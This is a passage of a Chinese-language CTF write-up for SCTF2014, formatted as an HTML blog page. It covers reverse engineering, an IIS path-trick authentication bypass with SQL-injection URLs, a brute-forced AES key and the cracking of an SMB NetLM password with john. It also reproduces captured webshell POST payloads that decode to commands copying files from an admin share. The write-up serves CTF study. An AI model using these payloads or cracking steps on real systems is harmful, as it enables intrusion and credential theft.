@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Team：0xFA Misc10 (10pt)手持两把锟斤拷，口中疾呼烫烫烫下联是什么呢？ flag：脚踏千朵屯屯屯，笑看万物锘锘锘（全角逗号） Re50 (50pt)拖入IDA： .text:0000000000400772                 mov     eax, [rbp-48h]  ; 计数 .text:0000000000400775                 cd">
+<meta name="keywords" content="ctf,writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SCTF2014 Writeup">
+<meta property="og:url" content="http://rickgray.me/2014/12/08/sctf2014-writeup/index.html">
+<meta property="og:site_name" content="rickgray.me">
+<meta property="og:description" content="Team：0xFA Misc10 (10pt)手持两把锟斤拷，口中疾呼烫烫烫下联是什么呢？ flag：脚踏千朵屯屯屯，笑看万物锘锘锘（全角逗号） Re50 (50pt)拖入IDA： .text:0000000000400772                 mov     eax, [rbp-48h]  ; 计数 .text:0000000000400775                 cd">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://rickgray.me/images/ctfs/sctf2014/code400_img.jpeg">
+<meta property="og:updated_time" content="2018-04-24T15:49:05.537Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SCTF2014 Writeup">
+<meta name="twitter:description" content="Team：0xFA Misc10 (10pt)手持两把锟斤拷，口中疾呼烫烫烫下联是什么呢？ flag：脚踏千朵屯屯屯，笑看万物锘锘锘（全角逗号） Re50 (50pt)拖入IDA： .text:0000000000400772                 mov     eax, [rbp-48h]  ; 计数 .text:0000000000400775                 cd">
+<meta name="twitter:image" content="http://rickgray.me/images/ctfs/sctf2014/code400_img.jpeg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>SCTF2014 Writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="http://github.com/RickGray">Projects</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2015/01/30/review-the-re-module-of-python/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2014/12/04/quasibot-backdoor-analysis/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://rickgray.me/2014/12/08/sctf2014-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&text=SCTF2014 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&title=SCTF2014 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&is_video=false&description=SCTF2014 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SCTF2014 Writeup&body=Check out this article: http://rickgray.me/2014/12/08/sctf2014-writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&title=SCTF2014 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&title=SCTF2014 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&title=SCTF2014 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&title=SCTF2014 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://rickgray.me/2014/12/08/sctf2014-writeup/&name=SCTF2014 Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Team：0xFA"><span class="toc-number">1.</span> <span class="toc-text">Team：0xFA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc10-10pt"><span class="toc-number"></span> <span class="toc-text">Misc10 (10pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re50-50pt"><span class="toc-number"></span> <span class="toc-text">Re50 (50pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pt100-100pt"><span class="toc-number"></span> <span class="toc-text">Pt100 (100pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code200-200pt"><span class="toc-number"></span> <span class="toc-text">Code200 (200pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code400-400pt"><span class="toc-number"></span> <span class="toc-text">Code400 (400pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc300-300pt"><span class="toc-number"></span> <span class="toc-text">Misc300 (300pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc400a-400pt"><span class="toc-number"></span> <span class="toc-text">Misc400a (400pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc400b-400pt"><span class="toc-number"></span> <span class="toc-text">Misc400b (400pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn200-200pt"><span class="toc-number"></span> <span class="toc-text">Pwn200 (200pt)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn300-300pt"><span class="toc-number"></span> <span class="toc-text">Pwn300 (300pt)</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SCTF2014 Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">rickgray.me</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2014-12-07T16:00:00.000Z" itemprop="datePublished">2014-12-08</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/writeup/">writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="Team：0xFA"><a href="#Team：0xFA" class="headerlink" title="Team：0xFA"></a>Team：0xFA</h3><hr>
+<h2 id="Misc10-10pt"><a href="#Misc10-10pt" class="headerlink" title="Misc10 (10pt)"></a>Misc10 (10pt)</h2><p>手持两把锟斤拷，口中疾呼烫烫烫<br>下联是什么呢？</p>
+<p>flag：<code>脚踏千朵屯屯屯，笑看万物锘锘锘</code>（全角逗号）</p>
+<h2 id="Re50-50pt"><a href="#Re50-50pt" class="headerlink" title="Re50 (50pt)"></a>Re50 (50pt)</h2><p>拖入IDA：</p>
+<pre><code>.text:0000000000400772                 mov     eax, [rbp-48h]  ; 计数
+.text:0000000000400775                 cdqe
+.text:0000000000400777                 movzx   eax, byte ptr [rbp+rax-40h] ; 取出用户名
+.text:000000000040077C                 add     eax, 3          ; 每一位加3
+.text:000000000040077F                 mov     edx, eax
+.text:0000000000400781                 mov     eax, [rbp-48h]
+.text:0000000000400784                 cdqe
+.text:0000000000400786                 mov     [rbp+rax-20h], dl
+.text:000000000040078A                 add     dword ptr [rbp-48h], 1
+.text:000000000040078E
+.text:000000000040078E loc_40078E:                             ; CODE XREF: .text:0000000000400770j
+.text:000000000040078E                 mov     eax, [rbp-48h]
+.text:0000000000400791                 cmp     eax, [rbp-44h]
+.text:0000000000400794                 jl      short loc_400772 ; 计数
+.text:0000000000400796                 lea     rdx, [rbp-20h]
+.text:000000000040079A                 lea     rax, [rbp-30h]
+.text:000000000040079E                 mov     rsi, rdx
+.text:00000000004007A1                 mov     rdi, rax
+.text:00000000004007A4                 call    _strcmp         ; gdb调试看到是与Jr3gFud6n比较
+.text:00000000004007A9                 test    eax, eax        ; 所以key是Jr3gFud6n每一位减去3. Go0dCra3k
+.text:00000000004007AB                 jz      short loc_4007B4
+.text:00000000004007AD                 mov     eax, 0
+.text:00000000004007B2                 jmp     short loc_4007CF
+.text:00000000004007B4 ; ---------------------------------------------------------------------------
+.text:00000000004007B4
+.text:00000000004007B4 loc_4007B4:                             ; CODE XREF: .text:00000000004007ABj
+.text:00000000004007B4                 lea     rax, [rbp-40h]
+.text:00000000004007B8                 mov     rsi, rax
+.text:00000000004007BB                 mov     edi, offset aTheFlagIsSctfS ; &quot;The flag is SCTF{ %s}\n&quot;
+.text:00000000004007C0                 mov     eax, 0
+.text:00000000004007C5                 call    _printf
+</code></pre><p>flag：<code>SCTF{Go0dCra3k}</code></p>
+<h2 id="Pt100-100pt"><a href="#Pt100-100pt" class="headerlink" title="Pt100 (100pt)"></a>Pt100 (100pt)</h2><p>根据题目页面的提示，需要找到后台，经过一番手动测试，发现存在 <code>/admin</code> 目录，但是需要验证。后来从exploit-db上找到了by pass的方法-<a href="http://www.exploit-db.com/exploits/19033/" target="_blank" rel="noopener">microsoft iis 6.0 and 7.5 - Multiple Vulnerabilities</a>。</p>
+<p>直接访问<code>http://gintama.sycsec.com/admin::$INDEX_ALLOCATION/index.php</code>可以绕过验证，然后就是注入by pass登陆了。id被限制为4位，并且输入<code>&#39;</code>被提示<code>WTF</code>，这里使用一个mysql查询中的一个trick<code>select * from user where id=&#39;&#39;&lt;1</code> or <code>select * from user where id=&#39;&#39;=0</code>，然后构造payload：</p>
+<pre><code>http://gintama.sycsec.com/admin::$INDEX_ALLOCATION/index.php?id=%27%3D0%23&amp;password=%27%3D0%23    
+    (or)
+http://gintama.sycsec.com/admin::$INDEX_ALLOCATION/index.php?id=%27%3C1%23&amp;password=%27%3C1%23
+</code></pre><p>可以成功by pass，得到flag。</p>
+<p>flag：<code>SCTF{Bypass_Auth_aNd_Easy_SQLi}</code></p>
+<h2 id="Code200-200pt"><a href="#Code200-200pt" class="headerlink" title="Code200 (200pt)"></a>Code200 (200pt)</h2><p>题目要求每次只能存2^i（i为偶数）或者取2^i（i为级数），0&lt;=i&lt;=99且每个i值只能出现一次，要求给出一个整数数，给出一组存取序列。</p>
+<p>此题转换为二进制来求解：</p>
+<pre><code>正数：
+    从低位往高位遍历，当偶数位为1时，直接记录i值（需存的值）；
+    遇到奇数位i值为1，将原值加上2^i再减去2^i，记录i值（需取的值）；
+    若为0继续遍历，直至完毕。
+
+负数：
+    从低位往高位遍历，当偶数位为1时，将原值加上2^i再加上2^i，记录i值（需存的值）；
+    遇到奇数位i值为1，记录i值（需取的值）；
+    若为0继续遍历，直至完毕。
+</code></pre><p>给出代码 <code>code200.py</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span><span class="params">(purpose)</span>:</span></span><br><span class="line">    n = int(purpose)</span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        n_bin = bin(n)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n_bin = bin(n)[<span class="number">3</span>:]</span><br><span class="line"></span><br><span class="line">    r_list = []</span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; n_bin.__len__():</span><br><span class="line">            <span class="keyword">if</span> n_bin[n_bin.__len__()-i<span class="number">-1</span>] == <span class="string">'1'</span>:</span><br><span class="line">                <span class="keyword">if</span> i % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">                    r_list.append(i)</span><br><span class="line">                    n += <span class="number">2</span>**i</span><br><span class="line">                    n_bin = bin(n)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r_list.append(i)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        n = abs(n)</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= n_bin.__len__():</span><br><span class="line">            <span class="keyword">if</span> n_bin[n_bin.__len__()-i<span class="number">-1</span>] == <span class="string">'1'</span>:</span><br><span class="line">                <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">                    r_list.append(i)</span><br><span class="line">                    n += <span class="number">2</span>**i</span><br><span class="line">                    n_bin = bin(n)[<span class="number">2</span>:]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    r_list.append(i)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    r_list.sort(reverse=<span class="keyword">True</span>)</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> r_list:</span><br><span class="line">        result += str(i) + <span class="string">' '</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">'218.2.197.248'</span>, <span class="number">10007</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        buf = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">print</span> buf</span><br><span class="line"></span><br><span class="line">        n = buf</span><br><span class="line">        answer = calc(n)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Answer: %s'</span> % str(answer)</span><br><span class="line">        s.send(answer + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
+<p>flag：<code>SCTF{h3I_r0xFmQw1pT2v}</code></p>
+<h2 id="Code400-400pt"><a href="#Code400-400pt" class="headerlink" title="Code400 (400pt)"></a>Code400 (400pt)</h2><p>万恶的出题者，题目给了个奇怪的脚本：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">fp = open(<span class="string">"secret.json"</span>, <span class="string">"r"</span>)</span><br><span class="line">secret = json.load(fp)</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> type(secret[<span class="string">"the answer to life the universe and everything"</span>]) != type(<span class="string">u"77"</span>):</span><br><span class="line">    destroy_the_universe()</span><br><span class="line"></span><br><span class="line">answer = hashlib.sha1(secret[<span class="string">"the answer to life the universe and everything"</span>]).hexdigest()[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">key = hashlib.sha1(secret[<span class="string">"Don't google what it is"</span>]).digest()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ord(key[<span class="number">4</span>])*(ord(key[<span class="number">5</span>])<span class="number">-5</span>) != <span class="number">17557</span>:</span><br><span class="line">    destroy_the_universe()</span><br><span class="line"></span><br><span class="line">keys = [<span class="string">"hey"</span>+key[<span class="number">2</span>]+<span class="string">"check"</span>+key[<span class="number">3</span>]+<span class="string">"it"</span>+key[<span class="number">0</span>]+<span class="string">"out"</span>, </span><br><span class="line">        <span class="string">"come"</span>+key[<span class="number">1</span>]+<span class="string">"on"</span>+key[<span class="number">4</span>]+<span class="string">"baby"</span>+key[<span class="number">5</span>]+<span class="string">"~~!"</span>]</span><br><span class="line">answer = AES.new(keys[<span class="number">1</span>], AES.MODE_ECB).encrypt(AES.new(keys[<span class="number">0</span>], AES.MODE_ECB).encrypt(answer))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> base64.b64encode(answer) == <span class="string">"fm2knkCBHPuhCQHYE3spag=="</span>:</span><br><span class="line">    fp = open(<span class="string">"%s.txt"</span> % hashlib.sha256(key).hexdigest(), <span class="string">"w"</span>)</span><br><span class="line">    fp.write(secret[<span class="string">"The entrance to the new world"</span>])</span><br><span class="line">    fp.close()</span><br></pre></td></tr></table></figure>
+<p>明显是要爆破，首先算出两组 <code>key[4]&amp;key[5]</code> 的值，分别为 <code>97&amp;186</code> 和 <code>181&amp;102</code>。</p>
+<p>然后暴力破解key的前四位，这里 <code>secret[&quot;the answer to life the universe and everything&quot;]</code> 的值不太重要（虽然我知道他是u”42”），直接每一次通过base64值逆算出的 <code>answer</code> 符合所有字符在 <code>[a-f0-9]</code> 的范围就行了（因为取的是sha1的hex）。</p>
+<p>这里不得不吐槽了，总共两组情况，rp爆发的我选择了正确的一组开始爆破，爆了10+小时终于出key（要是rp差了那不哭死）。这里情不自禁地贴出爆破的截图：</p>
+<p><img src="/images/ctfs/sctf2014/code400_img.jpeg" alt="img"></p>
+<p>最后得到 <code>key = &#39;\x81\x69\x37\x88\x61\xba&#39;</code>，然后通过原始脚本得到最后创建的文件名 <code>5bd15779b922c19ef9a9ba2f112df1f2dbb0ad08bbf9edac27a28a0f3ba753f4.txt</code>，纠结半天的sha256值。最后发现该文件位于 <code>http://download.sycsec.com/code/code400/5bd15779b922c19ef9a9ba2f112df1f2dbb0ad08bbf9edac27a28a0f3ba753f4.txt</code>，得到第二个tips：</p>
+<pre><code>Welcome to the new world!
+
+Mallory把Alice给Bob的钱藏在了一个神秘的地方，还把地址加密，然后带着密钥，坐黄金之心离开了！
+
+没有密钥的plusplus7用黑科技复原了一部分明文，然后打麻将去了，所以剩下的就交给你啦！
+
+P.S.听说您很会暴力破解：）
+
+====== Base64格式密文 ======
+Or18/xSC2xW5pT7BLbIE7YPGLwWytbZsxupMp4w6iaa0QvtYZUMefkf43wmzR36MekHm23wgI4buIJLGk7m7gTq9fP8UgtsVuaU+wS2yBO2Dxi8FsrW2bMbqTKeMOommtEL7WGVDHn5H+N8Js0d+jHpB5tt8ICOG7iCSxpO5u4E6vXz/FILbFbmlPsEtsgTtg8YvBbK1tmzG6kynjDqJprRC+1hlQx5+R/jfCbNHfox6QebbfCAjhu4gksaTubuBOr18/xSC2xW5pT7BLbIE7YPGLwWytbZsxupMp4w6iaa0QvtYZUMefkf43wmzR36MekHm23wgI4buIJLGk7m7gTq9fP8UgtsVuaU+wS2yBO2Dxi8FsrW2bMbqTKeMOommtEL7WGVDHn5H+N8Js0d+jHpB5tt8ICOG7iCSxpO5u4E=
+
+
+====== 藏宝地址 ======
+*****n**M****H***j***Wx*******d************h*****3****=*******==******t**F**M**f***hM************3***H*w**J*********=**==*******U******E**95**V*c*N****5**t*M*****J*c*Q*****c*h5**0******==*==****NUR*******************X2*u*H**Y************G**P****=***********0*****************************f***5****OX*********=*******=****
+</code></pre><p>用base64解密那串<code>Base64格式密文</code>，发现是5组64位长的相同字串（共320位），同时发现<code>藏宝地址</code>也为320位。纠结许久，发现将<code>藏宝地址</code>以64位一组分为5组然后叠在一起，可以合成一个不含<code>*</code>的base64编码后的字符串：</p>
+<pre><code>*****n**M****H***j***Wx*******d************h*****3****=*******==
+******t**F**M**f***hM************3***H*w**J*********=**==*******
+U******E**95**V*c*N****5**t*M*****J*c*Q*****c*h5**0******==*==**
+**NUR*******************X2*u*H**Y************G**P****=**********
+*0*****************************f***5****OX*********=*******=****
+
+||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||
+
+U0NURntEMF95MHVfcjNhMWx5X2tuMHdfY3J5cHQwOXJhcGh5P30=============
+</code></pre><p>最后base64解码<code>U0NURntEMF95MHVfcjNhMWx5X2tuMHdfY3J5cHQwOXJhcGh5P30=============</code>得到flag。</p>
+<p>flag：<code>SCTF{D0_y0u_r3a1ly_kn0w_crypt09raphy?}</code></p>
+<h2 id="Misc300-300pt"><a href="#Misc300-300pt" class="headerlink" title="Misc300 (300pt)"></a>Misc300 (300pt)</h2><p>从仅有的几个数据包里找到smb的认证过程。从中提取出服务端的<code>challenge: 0x1122334455667788</code>，以及客服端发出的认证请求中加密过的密码hash-<code>9e94258a03356914b15929fa1d2e290fab9c8f9f01999448</code>和<code>013f3cb06ba848f98a6ae6cb4a76477c5ba4e45cda73b475</code>。</p>
+<p>然后根据看雪上的一篇文章<a href="http://bbs.pediy.com/showthread.php?p=1203990" target="_blank" rel="noopener">《【原创】实验：SMB抓包破解windows登陆密码》</a>，使用彩虹表跑出明文的前7个字节<code>NETLMIS</code>，再使用msf下的辅助工具<code>halfsecond.rb</code>跑出后面部分：</p>
+<pre><code>➜  tools  ruby halflm_second.rb -n &quot;9e94258a03356914b15929fa1d2e290fab9c8f9f01999448&quot; -p &quot;NETLMIS&quot;
+[*] Trying one character...
+[*] Trying two characters (eta: 1.964212417602539 seconds)...
+[*] Trying three characters (eta: 449.80464363098145 seconds)...
+[*] Cracked: NETLMIS666
+</code></pre><p>最后使用 <code>netntlm.pl</code> 对明文进行大小写还原：</p>
+<pre><code>➜  run.linux.x64.mmx  perl netntlm.pl --seed &quot;NETLMIS666&quot; --file hash
+
+
+###########################################################################################
+The following LM responses have been previously cracked:
+
+The following NTLM responses have been previously cracked:
+    sysclover:NetLMis666:ROOT-53DD5327BC:9e94258a03356914b15929fa1d2e290fab9c8f9f01999448:013f3cb06ba848f98a6ae6cb4a76477c5ba4e45cda73b475:1122334455667788
+
+
+###########################################################################################
+Isolating accounts which have only had their LM response cracked.
+Account sysclover NTLM response previously cracked.
+
+
+###########################################################################################
+Testing seed password to determine whether it is the actual password.
+Loaded 1 password hash (NTLMv1 C/R MD4 DES (ESS MD5) [32/64])
+No password hashes left to crack (see FAQ)
+
+
+###########################################################################################
+The hashes contained within /tmp/john.6879/john.passwd have not been cracked.
+Executing the following (this could take a while...):
+
+john -format:netlm -config:/tmp/john.6879/john.conf -external:HalfLM -incremental:LM -session:/tmp/john.6879/john.session /tmp/john.6879/john.passwd
+
+ *If the passwords successfully crack, use this script again to crack the case-sensitive password
+ without feeding a seed password
+
+
+No password hashes loaded (see FAQ)
+</code></pre><p>最终得到明文密码：<code>NetLMis666</code></p>
+<p>flag：<code>SCTF{NetLMis666}</code></p>
+<h2 id="Misc400a-400pt"><a href="#Misc400a-400pt" class="headerlink" title="Misc400a (400pt)"></a>Misc400a (400pt)</h2><p>题目要求从攻击流量中找到<code>LateRain</code>的明文密码（&gt;_&lt;又是找密码）。分析了半天，看到了有一些<code>http</code>数据包，然后分析这些<code>http</code>数据，发现follow第<code>1840</code>个数据包，攻击者copy了一个funnydata文件为1.gif</p>
+<pre><code>POST /config.php HTTP/1.1
+Cache-Control: no-cache
+X-Forwarded-For: 136.0.217.252
+Referer: http://192.168.30.170
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Host: 192.168.30.170
+Content-Length: 685
+Connection: Close
+
+yo=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJmNvcHkgXFwxOTIuMTY4LjMwLjE4NFxDJFx3aW5kb3dzXHRhc2tzXGZ1bm55ZGF0YSAuXGJhY2t1cFwxLmdpZiZlY2hvIFtTXSZjZCZlY2hvIFtFXQ%3D%3D
+</code></pre><p>对post的参数进行部分还原，得到关键命令：</p>
+<pre><code>cd /d &quot;c:\\inetpub\\wwwroot\\&quot;&amp;copy \\\\192.168.30.184\\C$\\windows\\tasks\\funnydata .\\backup\\1.gif&amp;echo [S]&amp;cd&amp;echo [E]    
+</code></pre><p>然后follow第 <code>10054</code> 个数据包，发现攻击者通过webshell压缩了该 <code>1.git</code>：</p>
+<pre><code>POST /config.php HTTP/1.1
+Cache-Control: no-cache
+X-Forwarded-For: 136.0.217.252
+Referer: http://192.168.30.170
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Host: 192.168.30.170
+Content-Length: 733
+Connection: Close
+
+yo=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=Y21k&amp;z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJkM6XHByb2dyYX4xXFdpblJBUlxyYXIgYSBDOlxJbmV0cHViXHd3d3Jvb3RcYmFja3VwXHd3d3Jvb3QucmFyIEM6XEluZXRwdWJcd3d3cm9vdFxiYWNrdXBcMS5naWYgLWhwSkpCb29tJmVjaG8gW1NdJmNkJmVjaG8gW0Vd
+</code></pre><p>对post的参数进行部分还原，得到关键命令：</p>
+<pre><code>cd /d &quot;c:\\inetpub\\wwwroot\\&quot;&amp;C:\\progra~1\\WinRAR\\rar a C:\\Inetpub\\wwwroot\\backup\\wwwroot.rar C:\\Inetpub\\wwwroot\\backup\\1.gif -hpJJBoom&amp;echo [S]&amp;cd&amp;echo [E]
+</code></pre><p>压缩 <code>C:\\Inetpub\\wwwroot\\backup\\1.gif</code> 为 <code>C:\\Inetpub\\wwwroot\\backup\\wwwroot.rar</code>，且密码为 <code>JJBoom</code>（真有意思）。然后follow第 <code>17729</code> 个数据包（rar传输数据），将其另存为 <code>1.rar</code>，然后解压（输入密码）得到 <code>1.gif</code>。</p>
